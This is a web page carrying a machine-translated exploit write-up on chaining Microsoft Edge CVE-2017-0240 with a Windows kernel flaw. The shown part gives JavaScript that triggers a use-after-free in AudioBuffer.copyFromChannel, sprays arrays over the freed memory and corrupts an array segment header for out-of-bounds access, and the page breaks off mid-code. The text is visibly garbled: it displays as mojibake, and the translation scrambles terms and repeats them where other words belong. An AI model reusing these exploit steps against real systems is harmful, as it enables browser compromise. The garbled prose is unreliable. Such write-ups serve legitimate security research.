<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>๐ ๐ฉ ๐ฅ Microsoft Edge ูู CVE ุฅูู RCE ุนูู ูุธุงู ุงูุชุดุบูู Windows 10 ๐จโโ๏ธ โน๏ธ ๐</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ูู ุฅุทุงุฑ ูุฐู ุงูููุงูุฉ ุ ุณููุธุฑ ุจุชูุตูู ูุงู ูู ุนูููุฉ ูุชุงุจุฉ ุงุณุชุบูุงู ูุซุบุฑุฉ ุฃูููุฉ ูู Microsoft Edge ุ ูุน ุงูุฎุฑูุฌ ุงููุงุญู ูู ุตูุฏูู ุงูุญูุงูุฉ. ุฅุฐุง ููุช ููุชููุง ุจูุนุฑูุฉ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Microsoft Edge ูู CVE ุฅูู RCE ุนูู ูุธุงู ุงูุชุดุบูู Windows 10</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/455594/" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="ููุฏูุฉ"></p><br><p style=";text-align:right;direction:rtl">  ูู ุฅุทุงุฑ ูุฐู ุงูููุงูุฉ ุ ุณููุธุฑ ุจุชูุตูู ูุงู ูู ุนูููุฉ ูุชุงุจุฉ ุงุณุชุบูุงู ูุซุบุฑุฉ ุฃูููุฉ ูู Microsoft Edge ุ ูุน ุงูุฎุฑูุฌ ุงููุงุญู ูู ุตูุฏูู ุงูุญูุงูุฉ.  ุฅุฐุง ููุช ููุชููุง ุจูุนุฑูุฉ ุดูู ูุฐู ุงูุนูููุฉ ุ ููุฑุญุจุงู ุจู! </p><a name="habracut"></a><br><h2 id="vvedenie" style=";text-align:right;direction:rtl">  ููุฏูุฉ </h2><br><p style=";text-align:right;direction:rtl"> ูู ุฃุญุฏุซ <code>Pwn2Own 2019</code> ูู ูููุชุฑูุงู ุ ูู ูุฆุฉ ุงููุชุตูุญุงุช ุ ุชู ุนุฑุถ ุงุณุชุบูุงู ูููุฑุตูุฉ <code>Microsoft Edge</code> .  ุชู ุงุณุชุฎุฏุงู ุซุบุฑุงุช ุงุซููู ููุฐุง: <code>double free</code> ูู ุงูุนุงุฑุถ ูุงูุถุนู ุงูููุทูู ููุฎุฑูุฌ ูู ุฑูู.  ุชู ุฅุบูุงู ูุฐู ุงูุซุบุฑุงุช ุงูุฃูููุฉ ูุคุฎุฑูุง ูุชุนููู <code>CVE</code> ุงููุทุงุจู ููุง: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="><code>CVE-2019-0940</code></a> ู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="><code>CVE-2019-0938</code></a> .  ููููู ูุฑุงุกุฉ ุงููุฒูุฏ ุญูู ุงูุซุบุฑุงุช ุงูุฃูููุฉ ูู ุงููุฏููุฉ: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Pwn2Own 2019: Microsoft Edge Renderer Exploitation (CVE-2019-0940).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุฌุฒุก 1</a> ู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Pwn2Own 2019: Microsoft Eedge Sandbox Escape (CVE-2019-0938).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุฌุฒุก 2</a> . </p><br><p style=";text-align:right;direction:rtl">  ูุฌุฒุก ูู ููุงูุชูุง ุ ูุฑูุฏ ุฅุธูุงุฑ ุนูููุฉ ูุชุงุจุฉ ูุซู ูุฐุง ุงูุงุณุชุบูุงู ููู ูู ุงูููุช ูุงูููุงุฑุฏ ุงููุงุฒูุฉ ูุฐูู ุจุงุณุชุฎุฏุงู ูุซุงู <code>Microsoft Edge</code> ุนูู <code>Windows 10</code> ุจุงุณุชุฎุฏุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="><code>CVE-2017-0240</code></a> ู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="><code>CVE-2016-3309</code></a> .  ุฃุญุฏ ุงูุงุฎุชูุงูุงุช ูู ุฃูู ุฅุฐุง ูุงู ุงูุงุณุชุบูุงู <code>Pwn2Own</code> ุนูู <code>Pwn2Own</code> ุงุณุชุฎุฏู ุซุบุฑุฉ ุฃูููุฉ ููุทููุฉ ููุฎุฑูุฌ ูู <code>Pwn2Own</code> ุงุณุชุฎุฏุงู ุงูุซุบุฑุฉ ุงูุฃูููุฉ ูู ููุงุฉ <code>Windows 10</code> ููุฎุฑูุฌ ูู <code>Pwn2Own</code> ูู ุงูุณููุงุฑูู ุงูุฎุงุต ุจูุง.  ููุง ุชุธูุฑ ุงูุชุตุญูุญุงุช ูู <code>Microsoft</code> ุ ููุงู ููุงุท ุถุนู ูู ุงูููุงุฉ ุฃูุซุฑ ุจูุซูุฑ ูู ููุงุท ุงูุถุนู ูู ุชุทุจูู ุงูุตูุฏูู ุงูุฑูู.  ูุชูุฌุฉ ูุฐูู ุ ูู ุงููุฑุฌุญ ุฃู ุชูุงุฌู ูุซู ูุฐู ุงูุณูุณูุฉ ูู ุงูุซุบุฑุงุช ุงูุฃูููุฉ ุ ูุณูููู ูู ุงููููุฏ ุฃู ุชุนุฑู ูููุธูู IS ูู ุงูุดุฑูุงุช. </p><br><h2 id="ishodnye-dannye" style=";text-align:right;direction:rtl">  ูุตุฏุฑ ุงูุจูุงูุงุช </h2><br><p style=";text-align:right;direction:rtl">  ุณุชุบุทู ูุฐู ุงูููุงูุฉ ุนูููุฉ ูุชุงุจุฉ ุงุณุชุบูุงู ูููู ูุงุญุฏ ููุชุตูุญ <code>Microsoft Edge</code> .  ุณูุชู ุชุดุบูู <code>CVE-2017-0240</code> .  ุณูุชู ุชูููุฐ ุงููุฑุญูุฉ ุงูุฃููู ูู ุงูุนูููุฉ ุนูู ุฃุณุงุณ ููุงุฏ ูู ุงููุตุฏุฑ [1] ุ <code>arbitrary address read/write</code> ุงูุจุฏุงุฆูุฉ ุ ููุฐูู ุงูุชุนุฑู ุนูู ุงูุชูููุงุช ุงููุฎุชููุฉ ุงูุชู ูุฏ ุชููู ูููุฏุฉ ุนูุฏ ุงุณุชุบูุงู ูุฐู ุงูุซุบุฑุงุช ุงูุฃูููุฉ.  ุจุนุฏ ุฐูู ุ ุณูู ููุฏู ูู ุฃุฏุงุฉ <code>pwn.js</code> ุ ูุงูุชู ุณูู ุชุณุงุนุฏู ูู ุงูุญุตูู ุนูู ุฏุนูุฉ ูููุธุงุฆู ุงูุชุนุณููุฉ ุงููุงุฆูุฉ ุนูู ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ุงูุชุนุณููุฉ ุ <code>pwn.js</code> ุฃูุถูุง ูู ุงูุนุฏูุฏ ูู ูุณุงุฆู <code>mitigations</code> ูุทุฑู ุชุฌุงูุฒูุง.  ูู ุงููุฑุญูุฉ ุงูุฃุฎูุฑุฉ ุ ุณูุชู ุงุณุชุบูุงู <code>CVE-2016-3309</code> ุญุตุงูุฉ kernel ูู Windows <code>CVE-2016-3309</code> ูุฒูุงุฏุฉ ุงูุงูุชูุงุฒุงุช ูุชุฌุงูุฒ ูููุฏ <code>AppContainer</code> ูุงูุชุญูู ุงููุงูู ูู ุงูุฌูุงุฒ ุงูุฐู ุชูุช ููุงุฌูุชู. </p><br><p style=";text-align:right;direction:rtl">  ุณูุชู ุชูููุฐ ุงูุนูููุฉ ูู ุงูุญุงูู ุจุงุณุชุฎุฏุงู <code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code> <code>Microsoft Edge (40.15063.0.0)</code> . </p><br><h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva" style=";text-align:right;direction:rtl">  ุงูุฎุทูุฉ 1. ุงูุญุตูู ุนูู <code>arbitrary address read/write</code> ุงูุจุฏุงุฆูุฉ </h2><br><h3 id="opisanie-uyazvimosti-i-poluchenie-oob" style=";text-align:right;direction:rtl">  ูุตู ุงูุถุนู ูุงููุตูู ุฅูู <code>OOB</code> </h3><br><p style=";text-align:right;direction:rtl">  ุชูุฌุฏ ุซุบุฑุฉ ุฃูููุฉ ูู ุญุงูุฉ <code>use-after-free</code> type <code>use-after-free</code> ูู ุทุฑููุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">copyFromChannel ุงูุฎุงุตุฉ ุจุงููุงุฆู</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Audio Buffer</a> . </p><br><blockquote style=";text-align:right;direction:rtl">  AudioBuffer ูู ูุงุฌูุฉ ูุงุฏุฉ ุนุฑุถ ุตูุชูุฉ ูุตูุฑุฉ ููุฌูุฏุฉ ูู ุงูุฐุงูุฑุฉ ููุชู ุฅูุดุงุคูุง ูู ููู ุตูุชู ุจุงุณุชุฎุฏุงู ุทุฑููุฉ AudioContext.decodeAudioData () ุ ุฃู ูู ุงูุจูุงูุงุช ุงููุตุฏุฑ ุจุงุณุชุฎุฏุงู ุทุฑููุฉ AudioContext.createBuffer ().  ูููู ุชุดุบูู ุจูุงูุงุช ุงูุตูุช ุงูููุถูุนุฉ ูู AudioBuffer ูู AudioBufferSourceNode. </blockquote><p style=";text-align:right;direction:rtl">  ูููุฑ ุงูุนุฑุถ ุงูุชูุฏููู ุงูุฎุงุต <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code> ูุถุนู <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code> ุชุญูููุงู ููุตูุงู ูุซุบุฑุฉ ุฃูููุฉ ูุงูุชุตุญูุญ.  ุนูุฏ <code>copyFromChannel</code> ุงูุฃุณููุจ <code>copyFromChannel</code> ุ ูุชู ูุณุฎ ูุญุชููุงุช ููุงุฉ ุงููุฎุฒู ุงููุคูุช ุงูุตูุชู ุฅูู ุงููุฎุฒู ุงููุคูุช <code>destination</code> ุงููุญุฏุฏ ุจูุงุณุทุฉ ุงููุณูุทุฉ ุงูุฃููู.  ุชูุจู ุงูุทุฑููุฉ ุฃูุถูุง ุฑูู ุงูููุงุฉ ( <code>channelNumber</code> ) ูุงูุฅุฒุงุญุฉ ูู ุงููุฎุฒู ุงููุคูุช ุงูุตูุชู ( <code>startInChannel</code> ) ุ ุจุฏุกูุง ูู ุงููุณุฎ ุงูุถุฑูุฑู.  ูุจู ูุณุฎ ุงูุจูุงูุงุช ูุจุงุดุฑุฉ ุฅูู <code>destination</code> ูู ุงูุฏุงูุฉ <code>CDOMAudioBuffer::Var_copyFromChannel</code> ุ ูุชู ุชุฎุฒูู ุงููุฎุฒู ุงููุคูุช ุงููุคูุช ูุคูุชูุง (ูุชู ุชุฎุฒูู ุนููุงู ูุญุฌู ุงููุฎุฒู ุงููุคูุช ูู ูุชุบูุฑุงุช ุฏุงูุฉ ูุญููุฉ ุนูู ุงูููุฏุณ) <code>startInChannel</code> ููู ุงููุงุฆู <code>startInChannel</code> ู <code>startInChannel</code> ุฅูู ููุน <code>Int</code> ุ ูุงูุชู ูุชู ูู ุฎูุงููุง <code>valueOf</code> ุฃุณููุจ <code>valueOf</code> ูููุงุฆูุงุช ุงููุญููุฉ.  ูุดููุฉ ุนุฏู ุงูุญุตุงูุฉ ูู ุฃูู ูููู ุชุญุฑูุฑ ูุฎุฒู ูุคูุช ูุคูุชุงู ูู ููุช ุชุญููู ุงูููุน ูู ุงูุฃุณููุจ <code>valueOf</code> ูููุงุฆู <code>valueOf</code> .  ููุชุญูู ุ ูุณุชุฎุฏู ุงูููุฏ ุงูุชุงูู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ,     var t2 = new Float32Array(0x20000); var ta = new Uint8Array(t2.buffer); for (i=0;i&lt;t2.length;i++) t2[i] = 0x66; var myctx = new AudioContext(); var audioBuf = myctx.createBuffer(1, 0x25, 22050); //   -   var t = audioBuf.getChannelData(0); var ta2 = new Uint8Array(t.buffer); for(i=0;i&lt;ta2.length;i++) ta2[i]=0x55; //     valueOf var obj = { valueOf: function () { //   var worker = new Worker('worker.js'); worker.postMessage(0, [t2.buffer]); worker.terminate(); worker = null; //    sleep(1000); return 0; } }; //   audioBuf.copyFromChannel(t2, obj, 0);</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุณุชุฎุฏู ูุฐุง ุงูุฑูุฒ ุชูููุฉ <code>Web Workers</code> ูุชุญุฑูุฑ ุงููุฎุฒู ุงููุคูุช.  ุจุนุฏ ุฅูุดุงุก <code>Worker</code> ูุงุฑุบ ุ ูููููุง ุฅุฑุณุงู ุฑุณุงูุฉ ุฅููู ุจุงุณุชุฎุฏุงู ุทุฑููุฉ <code>postMessage</code> .  ุชุฃุฎุฐ ูุณูุทุฉ <code>transfer</code> ุงูุงุฎุชูุงุฑูุฉ ุงูุซุงููุฉ ูู ูุฐู ุงูุทุฑููุฉ ุตููููุง ูู ุงููุงุฆูุงุช <code>Transferable</code> ( <code>ArrayBuffer</code> ุฃู <code>MessagePost</code> ุฃู <code>ImageBitmap</code> ) ุ ูุณูุชู ููู ุญููู ุงููุงุฆู ุฅูู <code>Worker</code> ููู ูุตุจุญ ุงููุงุฆู ูุชุงุญูุง ูู ุงูุณูุงู ุงูุญุงูู ุ ูุจุงูุชุงูู ูููู ุญุฐูู.  ุจุนุฏ ุฐูู ุ ุชุญุฏุซ ุฏุนูุฉ <code>sleep</code> - ููู ูุธููุฉ ุชุชููู ูุคูุชูุง ุนู ุชูููุฐ ุงูุจุฑูุงูุฌ (ูุชู ุชูููุฐู ุจุดูู ูุณุชูู).  ูุนุฏ ุฐูู ุถุฑูุฑููุง ุญุชู ูุชููู ูุธุงู ุชุฌููุน ุงูุจูุงูุงุช ุงูููููุฉ ( <code>GC</code> ุ <code>Garbage Collector</code> ) ูู ุชุญุฑูุฑ ุงููุฎุฒู ุงููุคูุช ุงูุฐู ุชู ููู ุงูุญููู ุฅููู. </p><br><blockquote style=";text-align:right;direction:rtl">  ูููุฑ ุนูุงู ุงูููุจ ูุณููุฉ ุจุณูุทุฉ ูุชุดุบูู ุงูุจุฑุงูุฌ ุงููุตูุฉ ูู ูุคุดุฑ ุชุฑุงุจุท ุงูุฎูููุฉ.  ูููู ุฃู ูุคุฏู ูุคุดุฑ ุชุฑุงุจุท ุงูุนุงูู ุงูููุงู ุฏูู ุงูุชุฏุงุฎู ูุน ูุงุฌูุฉ ุงููุณุชุฎุฏู.  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ูููููู ุงูููุงู ุจุฅุฏุฎุงู / ุฅุฎุฑุงุฌ ุจุงุณุชุฎุฏุงู XMLHttpRequest (ุนูู ุงูุฑุบู ูู ุฃู ุตูุงุช responseXML ูุงูููุงุฉ ุณุชููู ุฏุงุฆููุง ุฎุงููุฉ).  ูููู ููุนุงูู ุงูุญุงูู ุฅุฑุณุงู ุฑุณุงุฆู JavaScript ุฅูู ุฑูุฒ ุงูููุดุฆ ูู ุฎูุงู ูุนุงูุฌ ุงูุฃุญุฏุงุซ ุงููุญุฏุฏ ุจูุงุณุทุฉ ูุฐุง ุงูุฑูุฒ (ูุงูุนูุณ). </blockquote><p style=";text-align:right;direction:rtl">  ุนู ุทุฑูู ุชุดุบูู ูุฐุง ุงูุฑูุฒ ูู Edge ุชุญุช ูุตุญุญ ุงูุฃุฎุทุงุก ุ ููููู ุงูุญุตูู ุนูู ุงูุชุนุทู ุงูุชุงูู. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="ุงูุฎุทูุฉ 01 ุชุญุทู ุงูุทุงุฆุฑุฉ"></p><br><p style=";text-align:right;direction:rtl">  ูุชูุฌุฉ ูุฐูู ุ ูุญุงูู ุงุณุชุฏุนุงุก <code>copyFromChannel</code> ูุณุฎ ูุญุชููุงุช ุงููุฎุฒู ุงููุคูุช ุงูุตูุช ูู ููุทูุฉ ุงูุฐุงูุฑุฉ ุบูุฑ ุงููุฎุตุตุฉ.  ูุงุณุชุบูุงู ูุดููุฉ ุนุฏู ุงูุญุตุงูุฉ ุ ูู ุงูุถุฑูุฑู ุชุญููู ุชุฎุตูุต ุฃู ูุงุฆูุงุช ูู ููุทูุฉ ุงูุฐุงูุฑุฉ ูุฐู.  ูู ูุฐู ุงูุญุงูุฉ ุ ุชููู ุดุฑูุญุฉ ุงูุตููู ูุซุงููุฉ. </p><br><p style=";text-align:right;direction:rtl">  ูุชู ุชุฑุชูุจ ุงููุตูููุงุช ูู <code>Chakra</code> (ูุญุฑู <code>JS</code> ุงููุณุชุฎุฏู ูู ูุณุชุนุฑุถ <code>Edge</code> ) ุนูู ุงููุญู ุงูุชุงูู: ูุงุฆู ุงูุตููู ูู ุญุฌู ุซุงุจุช ุ ููุชู ุชุฎุฒูู ูุคุดุฑุงุช ูุงุฆูุงุช ุงูุตููู (ุฃู ุงูููู ุ ูู ุญุงูุฉ <code>IntArray</code> ) ูู ููุทูุฉ ุฐุงูุฑุฉ ูููุตูุฉ - ุงูููุทุน ุ ุงููุคุดุฑ ุงูููุฌูุฏ ูู ุงููุงุฆู ูุฌููุนุฉ.  ูุญุชูู ุฑุฃุณ ุงูููุทุน ุนูู ูุนูููุงุช ูุชููุนุฉ ุ ุจูุง ูู ุฐูู ุญุฌู ุงููุทุนุฉ ุ ูุงูุฐู ูุชูุงูู ูุน ุญุฌู ุงููุตูููุฉ.  ุญุฌู ุงูุตููู ููุฌูุฏ ุฃูุถูุง ูู ูุงุฆู ุงูุตููู ููุณู.  ุจุดูู ุชุฎุทูุทู ุ ูุจุฏู ููุง ููู: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="ูููู ุตููู"></p><br><p style=";text-align:right;direction:rtl">  ูุจุงูุชุงูู ุ ุฅุฐุง ุชูููุง ูู ุชุญุฏูุฏ ููุทุน ุงูุตููู ูู ุงููุณุงุญุฉ ุงูุชู ุชู ุชุญุฑูุฑูุง ูุณุจููุง ุ ููููููุง ุงููุชุงุจุฉ ููู ุฑุฃุณ ููุทุน ุงูุตููู ุจูุญุชููุงุช ุงููุฎุฒู ุงููุคูุช ุงูุตูุชู.  ููููุงู ุจุฐูู ุ ูููู ุจุชุนุฏูู ุงูุฑูุฒ ุฃุนูุงู ุนู ุทุฑูู ุฅุถุงูุฉ ุงูุฃุณุทุฑ ุงูุชุงููุฉ ุจุนุฏ <code>sleep(1000);</code>  : </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs">... <span class="hljs-comment"><span class="hljs-comment">/*        ,    .   arr        */</span></span> arr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { arr[i] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; arr[i].length; j++) arr[i][j] = <span class="hljs-number"><span class="hljs-number">0x30303030</span></span>; } ...</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุชู ุชุญุฏูุฏ ุญุฌู ุงูุตูุงุฆู ุจุญูุซ ูุญุชู ุญุฌู ููุทุน ุงูุตููู ููุทุน ุงููููุฉ ุจุฃูููู (ุงูุญุฏ ุงูุฃุฏูู ููุฌุฒุก ุบูุฑ ูุงุจู ููุชุฌุฒุฆุฉ ูู ุฐุงูุฑุฉ ุงููููุฉ ุ ุญุฌูู 0x10000 ุจุงูุช).  ูู ุจุชุดุบูู ูุฐุง ุงูุฑูุฒ ุ ูุน ุชุญุฏูุฏ ูุธููุฉ <code>memcpy</code> ูููุทุฉ ุชููู (ุณูููู ููุงู ุงูุนุฏูุฏ ูู ููุงููุงุช <code>memcpy</code> ุ ูุฐูู ููู ุงูููุทูู ุฃู ุชุชููู ุฃููุงู ุนูุฏ <code>edgehtml!WebCore::AudioBufferData::copyBufferData</code> ) ุ ุงูุชู ููุน ูููุง ุงูุญุงุฏุซ.  ูุญุตู ุนูู ุงููุชูุฌุฉ ุงูุชุงููุฉ: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="ุงูุฎุทูุฉ 02"></p><br><p style=";text-align:right;direction:rtl">  ! ููุชุงุฒ  ุงูุขู ูููููุง ุงููุชุงุจุฉ ููู ุฑุฃุณ ููุทุน ุงูุตููู ุจููููุง ุงูุฎุงุตุฉ.  ุงูููู ุงูุฃูุซุฑ ุฅุซุงุฑุฉ ููุงูุชูุงู ูู ูุฐู ุงูุญุงูุฉ ูู ุญุฌู ุงููุตูููุฉ ุ ูุงูุชู ูููู ุฃู ูุฑู ุงูุฅุฒุงุญุฉ ูู ููุทุฉ ุงูุดุงุดุฉ ุฃุนูุงู.  ุชุบููุฑ ูุญุชููุงุช ุงููุฎุฒู ุงููุคูุช ุงูุตูุช ููุง ููู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs">... var t = audioBuf.getChannelData(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ta2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Uint32Array</span></span>(t.buffer); ta2[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0xffe0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0xfba6</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span> - <span class="hljs-number"><span class="hljs-number">2</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0x40404040</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>; ...</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงูุชุจู ุฅูู ูููุชู <code>ta2[14]</code> ู <code>ta2[15]</code> - ูููุง ูุดูุฑุงู ุจุงููุนู ุฅูู ุฑุฃุณ ุงูููุทุน ุ ููู ุฅูู ููู ุงูุตููู ููุณูุง.  ุจุงุณุชุฎุฏุงู ูุฐุง ุ ูููููุง ุชุญุฏูุฏ ุงูุตููู ุงูุฐู ูุญุชุงุฌู ูู ุตููู <code>arr</code> ุงูุนุงููู ุนูู ุงููุญู ุงูุชุงูู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs">... for(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(arr[i][<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-number"><span class="hljs-number">0x40404040</span></span> &amp;&amp; arr[i][<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>) { alert(<span class="hljs-string"><span class="hljs-string">'Target array idx: '</span></span> + i); target_idx = i; target_arr = arr[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุฅุฐุง ุชู ุงูุนุซูุฑ ุนูู ูุฌููุนุฉ ูุชูุฌุฉ ูุฐูู ุ ุชู ุชุบููุฑ ุฃูู ุนูุตุฑูู ุจุทุฑููุฉ ูุนููุฉ ุ ููู ุดูุก ุนูู ูุง ูุฑุงู.  ุงูุขู ูุฏููุง ูุฌููุนุฉ ุญุฌููุง ุฃูุจุฑ ูู ุญุฌููุง ูู ุงููุงูุน.  ูููู ุชุญุฑูุฑ ุงูุตูุงุฆู ุงููุชุจููุฉ. </p><br><p style=";text-align:right;direction:rtl">  ูู ุงูุถุฑูุฑู ููุง ุฃู ุชุชุฐูุฑ ุฃู ุญุฌู ุงููุตูููุฉ ููุฌูุฏ ูู ููุงููู: ูู ูุงุฆู ุงููุตูููุฉ ุ ุญูุซ ุจูู ุฏูู ุชุบููุฑ ุ ููู ููุทุน ุงููุตูููุฉ ุ ุญูุซ ูููุง ุจุฒูุงุฏุฉู.  ุงุชุถุญ ุฃู ุงูุญุฌู ูู ูุงุฆู ุงูุตููู ูุชู ุชุฌุงููู ุฅุฐุง ุชู ุชูููุฐ ุงูุฑูุฒ ูู ูุถุน <code>JIT</code> ูุชู ุชุญุณููู.  ูููู ุชุญููู ุฐูู ุจุณูููุฉ ุ ุนูู ุณุจูู ุงููุซุงู ุ ุนูู ุงููุญู ุงูุชุงูู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_get</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> target_arr[idx]; } <span 